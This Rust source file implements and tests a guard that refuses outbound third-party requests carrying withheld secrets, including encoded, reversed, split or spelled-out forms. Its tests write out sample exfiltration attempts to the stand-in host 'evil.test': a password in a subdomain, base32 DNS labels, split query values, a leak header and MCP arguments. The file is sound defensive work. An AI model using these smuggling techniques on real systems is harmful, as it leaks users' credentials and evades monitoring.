// SPDX-License-Identifier: GPL-3.0-or-later
//! The check of what goes to third parties (see [`crate::third_party`]): what
//! a URL, a query, tool arguments or a request header may hold.
//!
//! A third party is not local, so a placeholder is never resolved for it and
//! refuses the request, and so does any value the run has withheld, in every
//! spelling this check reads. They are the spellings local-model output is
//! cleaned of (DECLASS-2026-015) and more, since here the sender chooses the
//! encoding:
//! - as written, URL-decoded (up to three layers), with HTML character
//!   references and backslash escapes decoded, in any letter case, reversed;
//! - its characters spelled out one by one with separators, or its letters
//!   and digits anywhere in one part or across consecutive parts (a host
//!   name's labels, two query values) once they are long enough not to occur
//!   by chance ([`LONG_SKELETON`]);
//! - base64, hex or base32 of it at any alignment (a host label is where
//!   names carry data to a resolver);
//! - four consecutive digits of a withheld card, account, ID, IBAN or phone
//!   number, as digits or spelled out one at a time (DECLASS-2026-012);
//! - a span copied from sensitive content: the gate's 24-token window on the
//!   text, the local-output 4-token window on decoded text.
//!
//! Values under [`vault::CHECKED_VALUE_BYTES`] bytes are not looked for, as
//! in the gate's final check.

use super::{DIGITS, Engine, FRAGMENT_DIGITS, PLACEHOLDER, State};
use crate::audit::AuditEvent;
use crate::reencoded;
use crate::third_party::{Guard, Policy, Texts};
use crate::vault::{self, Vault};
use regex::Regex;
use std::collections::HashSet;
use std::sync::{Arc, LazyLock, Weak};

/// The start of a placeholder (`⟨secret:`), which refuses a text on its own:
/// URL syntax can cut a placeholder in two (`#` starts a fragment).
static PLACEHOLDER_START: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"⟨[A-Za-z_-]{2,24}:").expect("static regex"));

/// A placeholder, or the start of one, in `text`.
fn placeholder_in(text: &str) -> Option<String> {
    PLACEHOLDER
        .find(text)
        .or_else(|| PLACEHOLDER_START.find(text))
        .map(|m| m.as_str().to_owned())
}

/// A value's letters and digits are looked for across a whole part, or
/// across joined parts, only from this many: a shorter run occurs in
/// ordinary text by chance.
const LONG_SKELETON: usize = 8;

/// What the check found, without the value.
enum Found {
    Placeholder(String),
    /// A withheld value (by its token) and the spelling it was in.
    Value(String, &'static str),
    Digits,
    Quote,
}

impl Found {
    fn reason(&self, vault: &Vault, destination: &str) -> String {
        match self {
            Found::Placeholder(token) => format!(
                "it contains the placeholder {token}; placeholders stand for withheld values \
and are never resolved for {destination}"
            ),
            Found::Value(token, how) => {
                let what = vault
                    .value_of(token)
                    .map(|(_, e)| format!("a {} value from {}", e.kind.tag(), e.origin))
                    .unwrap_or_else(|| "a withheld value".into());
                format!("it contains {what}{how}; sensitive values are never sent to {destination}")
            }
            Found::Digits => format!(
                "it contains digits of a withheld number; they are never sent to {destination}"
            ),
            Found::Quote => {
                format!("it quotes sensitive content; that is never sent to {destination}")
            }
        }
    }
}

/// The engine's check, held by a [`Guard`]. It holds the engine weakly: a
/// guard kept past the run refuses everything.
struct EnginePolicy(Weak<Engine>);

impl Policy for EnginePolicy {
    fn refusal(&self, destination: &str, texts: &Texts) -> Option<String> {
        match self.0.upgrade() {
            Some(engine) => engine.third_party_refusal(destination, texts),
            None => Some("the run that asked for it has ended".into()),
        }
    }

    fn refused(&self, channel: &str, destination: &str, reason: &str) {
        if let Some(engine) = self.0.upgrade() {
            engine.record(AuditEvent::OutboundRefused {
                channel: channel.into(),
                destination: destination.into(),
                reason: reason.into(),
            });
        }
    }
}

impl Engine {
    /// The owned check handed to third-party clients.
    pub(super) fn guard(&self) -> Guard {
        Guard::new(Arc::new(EnginePolicy(self.me.clone())))
    }

    /// Why `texts` may not be sent to `destination`, or `None`.
    pub(super) fn third_party_refusal(&self, destination: &str, texts: &Texts) -> Option<String> {
        let st = self.lock();
        let grams = numbers(&st.vault);
        let found = texts
            .parts
            .iter()
            .find_map(|part| found_in(&st, &grams, part))
            .or_else(|| texts.joined.iter().find_map(|j| found_across(&st, j)))?;
        Some(found.reason(&st.vault, destination))
    }
}

/// Consecutive digits of a withheld number that identify it inside a longer
/// number (by chance about one in a hundred million, as the canary matcher
/// counts them).
const LONG_FRAGMENT: usize = 8;

/// The digits of the withheld identifying numbers (card, account, ID, IBAN,
/// phone), and every run of [`LONG_FRAGMENT`] of them.
struct Numbers {
    digits: Vec<String>,
    long: HashSet<Vec<u8>>,
}

fn numbers(vault: &Vault) -> Numbers {
    let digits: Vec<String> = vault
        .values()
        .filter(|(_, e)| e.kind.is_numeric_identifier())
        .map(|(v, _)| v.chars().filter(char::is_ascii_digit).collect::<String>())
        .filter(|d| d.len() >= FRAGMENT_DIGITS)
        .collect();
    let long = digits
        .iter()
        .flat_map(|d| d.as_bytes().windows(LONG_FRAGMENT).map(<[u8]>::to_vec))
        .collect();
    Numbers { digits, long }
}

/// Whether `text` holds a number made of a withheld number's digits: a
/// number standing alone (no letter or digit next to it, so not part of a
/// hash or an identifier) of [`FRAGMENT_DIGITS`] or more digits that all
/// occur in a row in a withheld number (a card's last four, the digits of one
/// group), or [`LONG_FRAGMENT`] of them in a row inside a longer number. A
/// timestamp or a digest sharing four digits with a card by chance is not
/// one: the rule for local output (DECLASS-2026-012), applied to every number
/// in a URL, refused one query in fifteen that held a number.
fn has_fragment(numbers: &Numbers, text: &str) -> bool {
    if numbers.digits.is_empty() {
        return false;
    }
    let bytes = text.as_bytes();
    let alone = |at: Option<usize>| {
        at.and_then(|i| bytes.get(i))
            .is_none_or(|b| !b.is_ascii_alphanumeric())
    };
    DIGITS.find_iter(text).any(|m| {
        let run = m.as_str();
        if run.len() < FRAGMENT_DIGITS || !alone(m.start().checked_sub(1)) || !alone(Some(m.end()))
        {
            return false;
        }
        numbers.digits.iter().any(|d| d.contains(run))
            || run
                .as_bytes()
                .windows(LONG_FRAGMENT)
                .any(|w| numbers.long.contains(w))
    })
}

/// A withheld value in bytes decoded from an encoding.
fn found_decoded(st: &State, decoded: &[u8]) -> Option<Found> {
    let lowered = decoded.to_ascii_lowercase();
    if let Some(token) = st.vault.find_lowered(&lowered) {
        return Some(Found::Value(token.to_owned(), " in an encoded form"));
    }
    if let Some(token) = st.vault.find_window(&lowered) {
        return Some(Found::Value(
            token.to_owned(),
            " (part of it) in an encoded form",
        ));
    }
    (st.overlap
        .redact_strict(&String::from_utf8_lossy(decoded))
        .1
        > 0)
    .then_some(Found::Quote)
}

/// What one part of a request holds that may not be sent.
fn found_in(st: &State, grams: &Numbers, text: &str) -> Option<Found> {
    let forms = reencoded::outbound_forms(text);
    if let Some(p) = forms.iter().find_map(|f| placeholder_in(f)) {
        return Some(Found::Placeholder(p));
    }
    let value = |token: &str, how| Some(Found::Value(token.to_owned(), how));
    for f in &forms {
        let lower = f.to_lowercase();
        if let Some(t) = st.vault.find_lowered(lower.as_bytes()) {
            return value(t, "");
        }
        let reversed: String = lower.chars().rev().collect();
        if let Some(t) = st.vault.find_lowered(reversed.as_bytes()) {
            return value(t, " reversed");
        }
        if has_fragment(grams, f)
            || reencoded::spelled_digits(f)
                .iter()
                .any(|d| has_fragment(grams, d))
        {
            return Some(Found::Digits);
        }
        for run in reencoded::spaced_runs(f) {
            let spelled: String = run.chars.iter().map(|&(s, e)| &f[s..e]).collect();
            let sk = vault::skeleton(&spelled);
            if let Some(t) = st.vault.find_skeleton(&sk, vault::CHECKED_VALUE_BYTES) {
                return value(t, " spelled out");
            }
        }
        let sk = vault::skeleton(f);
        let sk_reversed: String = sk.chars().rev().collect();
        for s in [&sk, &sk_reversed] {
            if let Some(t) = st.vault.find_skeleton(s, LONG_SKELETON) {
                return value(t, " with its characters separated or rearranged");
            }
        }
        for run in reencoded::encoded_runs(f) {
            if let Some(found) = run.decoded.iter().find_map(|d| found_decoded(st, d)) {
                return Some(found);
            }
        }
        if let Some(found) = reencoded::base32_decodings(f)
            .iter()
            .find_map(|d| found_decoded(st, d))
        {
            return Some(found);
        }
        if st.overlap.redact(f).1 > 0 {
            return Some(Found::Quote);
        }
    }
    None
}

/// What consecutive parts of a request hold together (joined with spaces):
/// a placeholder or a value cut into pieces.
fn found_across(st: &State, joined: &str) -> Option<Found> {
    let forms = reencoded::outbound_forms(joined);
    if let Some(p) = forms.iter().find_map(|f| placeholder_in(f)) {
        return Some(Found::Placeholder(p));
    }
    for f in &forms {
        if let Some(t) = st.vault.find_lowered(f.to_lowercase().as_bytes()) {
            return Some(Found::Value(t.to_owned(), " across parts of the request"));
        }
        if let Some(t) = st.vault.find_skeleton(&vault::skeleton(f), LONG_SKELETON) {
            return Some(Found::Value(t.to_owned(), " cut into parts of the request"));
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::Engine;
    use crate::third_party::{Outgoing, Texts};
    use crate::view::{Presenter, Source};
    use serde_json::json;
    use std::sync::Arc;
    use url::Url;

    const PASSWORD: &str = "quartz-otter-5519";
    const CARD: &str = "4539148803436467";

    fn file(path: &str) -> Source {
        Source::File {
            path: path.into(),
            ranged: false,
        }
    }

    /// An engine primed on a workspace with the password in `.env` and the
    /// card in a data file, as a run starts.
    fn primed() -> (tempfile::TempDir, Arc<Engine>, String) {
        let d = tempfile::tempdir().unwrap();
        let ws = d.path().join("ws");
        std::fs::create_dir_all(ws.join("data")).unwrap();
        std::fs::write(ws.join(".env"), format!("DB_PASSWORD={PASSWORD}\n")).unwrap();
        let csv = format!("id,card\n1,{CARD}\n");
        std::fs::write(ws.join("data/customers.csv"), &csv).unwrap();
        let e = Engine::open(&d.path().join("run"), super::super::tests::policy(), None).unwrap();
        e.prime(&ws, &[".env".into(), "data/customers.csv".into()], "");
        let shown = e.present(
            &file(".env"),
            format!("DB_PASSWORD={PASSWORD}\n").as_bytes(),
        );
        let token = super::PLACEHOLDER.find(&shown).unwrap().as_str().to_owned();
        (d, e, token)
    }

    fn b64(bytes: &[u8]) -> String {
        const T: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut s = String::new();
        for g in bytes.chunks(3) {
            let n = (u32::from(g[0]) << 16)
                | (u32::from(*g.get(1).unwrap_or(&0)) << 8)
                | u32::from(*g.get(2).unwrap_or(&0));
            for k in 0..=g.len() {
                s.push(T[(n >> (18 - 6 * k)) as usize & 63] as char);
            }
        }
        s
    }

    fn b32(bytes: &[u8]) -> String {
        const T: &[u8; 32] = b"abcdefghijklmnopqrstuvwxyz234567";
        let (mut acc, mut bits, mut s) = (0u64, 0u32, String::new());
        for &b in bytes {
            acc = (acc << 8) | u64::from(b);
            bits += 8;
            while bits >= 5 {
                bits -= 5;
                s.push(T[((acc >> bits) & 31) as usize] as char);
            }
        }
        if bits > 0 {
            s.push(T[((acc << (5 - bits)) & 31) as usize] as char);
        }
        s
    }

    #[test]
    fn every_spelling_of_a_withheld_value_is_refused() {
        let (_d, e, token) = primed();
        let hex: String = PASSWORD.bytes().map(|b| format!("{b:02x}")).collect();
        let pct: String = PASSWORD.bytes().map(|b| format!("%{b:02X}")).collect();
        let html: String = PASSWORD
            .chars()
            .map(|c| format!("&#{};", c as u32))
            .collect();
        let spaced: String = PASSWORD
            .chars()
            .map(String::from)
            .collect::<Vec<_>>()
            .join(" ");
        let unicode: String = PASSWORD
            .chars()
            .map(|c| format!("\\u{:04x}", c as u32))
            .collect();
        for bad in [
            PASSWORD.to_owned(),
            PASSWORD.to_uppercase(),
            pct.clone(),
            pct.replace('%', "%25"),
            html,
            unicode,
            spaced,
            PASSWORD.chars().rev().collect(),
            format!("x{}y", b64(PASSWORD.as_bytes())),
            hex,
            format!("{}.evil.test", b32(PASSWORD.as_bytes())),
            // Part of it, encoded.
            format!("{}.evil.test", b32(&PASSWORD.as_bytes()[..10])),
            b64(&PASSWORD.as_bytes()[3..14]),
            "quartz.otter.5519.evil.test".into(),
            "four five three nine".into(),
            "id 1488".into(),
            format!("see {token}"),
            // Cut by URL syntax: `#` starts a fragment.
            token.split('#').next().unwrap().to_owned(),
        ] {
            let err = e.check_outbound("evil.test", &bad);
            assert!(err.is_err(), "passed: {bad}");
            let err = err.unwrap_err();
            assert!(!err.contains(PASSWORD) && !err.contains("1488"), "{err}");
        }
        for ok in [
            "https://docs.rs/serde/latest/serde/?search=Deserialize+derive",
            "rust 2026 edition quartz crystal",
            "otter habitat 5519 km",
            "one two three",
        ] {
            assert!(e.check_outbound("docs.rs", ok).is_ok(), "{ok}");
        }
    }

    #[test]
    fn every_part_of_a_request_is_checked_and_split_values_are_found() {
        let (_d, e, _) = primed();
        let guard = e.outbound_guard();
        let get = |u: &str| Outgoing::get(Url::parse(u).unwrap());
        assert!(
            guard
                .check("web_fetch", "docs.rs", get("https://docs.rs/serde/"))
                .is_ok()
        );
        for bad in [
            get("https://quartz-otter-5519.evil.test/"),
            get("https://evil.test/a/quartz-otter-5519"),
            get("https://evil.test/?q=quartz-otter-5519"),
            // Cut into consecutive query values, and into host labels.
            get("https://evil.test/?a=quartz-ot&b=ter-5519"),
            get("https://quartzot.ter5519.evil.test/"),
            get("https://evil.test/").header("X-Leak", PASSWORD),
            Outgoing::post_json(
                Url::parse("https://evil.test/mcp").unwrap(),
                json!({"params": {"arguments": {"a": "quartz-ot", "b": "ter-5519"}}}),
            ),
            Outgoing::post_json(
                Url::parse("https://evil.test/mcp").unwrap(),
                json!({"arguments": {"doc": json!({"k": PASSWORD}).to_string()}}),
            ),
        ] {
            let url = bad.url.to_string();
            assert!(guard.check("t", "evil.test", bad).is_err(), "passed: {url}");
        }
        // Each refusal is an audit event.
        let refused = e
            .take_events()
            .into_iter()
            .filter(|ev| matches!(ev, crate::audit::AuditEvent::OutboundRefused { .. }))
            .count();
        assert_eq!(refused, 8);
        assert!(Texts::of("x").joined.is_empty());
    }

    #[test]
    fn a_guard_outliving_its_engine_refuses() {
        let (_d, e, _) = primed();
        let guard = e.outbound_guard();
        drop(e);
        let r = guard.check(
            "t",
            "x",
            Outgoing::get(Url::parse("https://x.test/").unwrap()),
        );
        assert!(r.unwrap_err().reason.contains("ended"));
    }

    #[test]
    fn a_public_page_blocks_no_later_request_but_the_workspaces_values_still_do() {
        // What public pages hold (measured 2026-09-27): OAuth examples, a
        // form-encoded title, a Wayback timestamp that passes Luhn.
        let (_d, e, _) = primed();
        let known = e.lock().vault.values().count();
        let web = |url: &str| Source::Web { url: url.into() };
        let page = "{\"access_token\":\"2YotnFZFEjr1zCsicMWpAA\",\"token_type\":\"example\"}\n\
            password: \"password\"\n\
            https://web.archive.org/web/20170806110612/https://example.com/\n\
            https://en.wikipedia.org/w/index.php?returnto=The+Adventures+of+Captain+Comic\n";
        e.present(
            &web("https://www.rfc-editor.org/rfc/rfc6749"),
            page.as_bytes(),
        );
        assert_eq!(
            e.lock().vault.values().count(),
            known,
            "public page vaulted"
        );
        for (host, text) in [
            ("example.com", "http://example.com/"),
            (
                "www.mobygames.com",
                "/game/671/the-adventures-of-captain-comic/",
            ),
            (
                "duckduckgo.com",
                "oauth token_type example password grant 2017",
            ),
        ] {
            assert!(e.check_outbound(host, text).is_ok(), "{host} {text}");
        }
        // A workspace secret a page echoes is still replaced, and still blocks.
        let shown = e.present(
            &web("https://paste.example/leak"),
            format!("password={PASSWORD}\n").as_bytes(),
        );
        assert!(!shown.contains(PASSWORD), "{shown}");
        assert!(
            e.check_outbound("example.com", &format!("q={PASSWORD}"))
                .is_err()
        );
    }
}

#[cfg(test)]
mod public_answers {
    use super::Engine;
    use crate::view::{Presenter, Source};
    use serde_json::{Map, json};

    #[tokio::test(flavor = "multi_thread")]
    async fn a_local_answer_about_public_web_content_does_not_withhold_its_numbers() {
        // Seen in a live run: numbers of a bulky public JSON page, quoted in a
        // local answer about it, entered the vault as data and stayed masked
        // in later search results (and refused later queries).
        let (local, _) = crate::testing::scripted_local(vec![
            json!({"summary": "Crate listing.", "facts": []}).to_string(),
            json!({"answer": "serde has 123456789 downloads; its id is serde1234abcd.",
                "evidence_lines": [1], "unanswerable": false})
            .to_string(),
        ]);
        let d = tempfile::tempdir().unwrap();
        let e = Engine::open(d.path(), super::super::tests::policy(), Some(local)).unwrap();
        let page: String = (0..400)
            .map(|i| format!("{{\"id\":\"crate{i}\",\"downloads\":{}}}\n", 123456789 + i))
            .collect();
        let web = |url: &str| Source::Web { url: url.into() };
        let shown = e.present(&web("https://crates.io/api/v1/crates"), page.as_bytes());
        let handle = shown.split_whitespace().next().unwrap().to_owned();
        let mut args = Map::new();
        args.insert("handle".into(), json!(handle));
        args.insert("question".into(), json!("How many downloads has serde?"));
        let answer = e.call_tool("ask_local", &args).unwrap().unwrap();
        assert!(answer.contains("123456789"), "{answer}");
        assert!(answer.contains("serde1234abcd"), "{answer}");
        assert_eq!(e.lock().vault.values().count(), 0, "public numbers vaulted");
        let later = e.present(
            &web("https://crates.io/search"),
            b"serde: 123456789 downloads\n",
        );
        assert!(later.contains("123456789"), "{later}");
        assert!(e.check_outbound("crates.io", "serde 123456789").is_ok());
    }
}
